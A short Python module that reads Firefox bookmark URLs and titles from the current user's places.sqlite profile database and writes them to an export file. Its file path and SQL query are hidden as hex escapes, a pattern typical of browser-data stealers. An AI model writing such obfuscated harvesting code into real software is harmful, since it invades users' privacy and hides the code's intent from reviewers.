import os
import file_utils

'''
NOTE: This file file is related to procedures and processes in which bookmarks are
collected from Mozilla Firefox browser.
'''

def bookmark_scrape(export_file:str) -> str:
    browser_path:str = f"\x43\x3a\x2f\x55\x73\x65\x72\x73\x2f{os.getlogin()}\x2f\x41\x70\x70\x44\x61\x74\x61\x2f\x52\x6f\x61\x6d\x69\x6e\x67\x2f\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x46\x69\x72\x65\x66\x6f\x78\x2f\x50\x72\x6f\x66\x69\x6c\x65\x73\x2f\x72\x69\x6f\x69\x70\x70\x6f\x6d\x2e\x64\x65\x66\x61\x75\x6c\x74\x2d\x72\x65\x6c\x65\x61\x73\x65\x2f\x70\x6c\x61\x63\x65\x73\x2e\x73\x71\x6c\x69\x74\x65"
    query = '''
    \x20\x20\x20\x20\x53\x45\x4c\x45\x43\x54\x20\x6d\x6f\x7a\x5f\x70\x6c\x61\x63\x65\x73\x2e\x75\x72\x6c\x2c\x20\x6d\x6f\x7a\x5f\x70\x6c\x61\x63\x65\x73\x2e\x74\x69\x74\x6c\x65\x20\x46\x52\x4f\x4d\x20\x6d\x6f\x7a\x5f\x70\x6c\x61\x63\x65\x73\x20\x20\x20\x20\x4a\x4f\x49\x4e\x20\x6d\x6f\x7a\x5f\x62\x6f\x6f\x6b\x6d\x61\x72\x6b\x73\x20\x4f\x4e\x20\x6d\x6f\x7a\x5f\x62\x6f\x6f\x6b\x6d\x61\x72\x6b\x73\x2e\x66\x6b\x20\x3d\x20\x6d\x6f\x7a\x5f\x70\x6c\x61\x63\x65\x73\x2e\x69\x64\x20\x20\x20\x20\x57\x48\x45\x52\x45\x20\x6d\x6f\x7a\x5f\x62\x6f\x6f\x6b\x6d\x61\x72\x6b\x73\x2e\x66\x6b\x20\x3d\x20\x6d\x6f\x7a\x5f\x70\x6c\x61\x63\x65\x73\x2e\x69\x64\x3b\x20\x20\x20\x20
    '''
    try: bookmarks:list = file_utils.sql_bookmark_scrape(browser_path= browser_path, query= query)
    except: return "Mozilla Firefox files not found."
    else: return file_utils.write(export_file= export_file, bookmarks= bookmarks)